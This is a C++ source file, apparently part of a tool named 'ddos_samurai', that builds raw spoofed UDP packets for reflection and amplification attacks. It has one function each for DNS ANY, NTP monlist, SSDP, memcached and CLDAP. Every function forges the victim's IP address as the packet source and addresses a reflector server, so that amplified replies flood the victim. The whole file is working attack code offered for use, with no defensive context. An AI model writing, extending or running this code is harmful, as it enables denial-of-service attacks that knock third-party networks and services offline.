#include "engine.hpp"
#include "detail.hpp"

namespace ddos_samurai::cpu_native {
using namespace detail;
std::vector<uint8_t> create_dns_amp_packet(const std::string& reflector_ip,
                                           const std::string& victim_ip,
                                           const std::string& dns_name) {
  const auto payload = build_dns_query(dns_name, "ANY", true, true, 0);
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    53,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ntp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00};
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    123,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ssdp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const auto payload = bytes_from_string(
      "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n");
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    1900,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_memcached_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                                        's',  't',  'a',  't',  's',  '\r', '\n'};
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    11211,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ldap_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {
      0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00, 0x0a,
      0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b,
      0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
  };
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    389,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

}  // namespace ddos_samurai::cpu_native
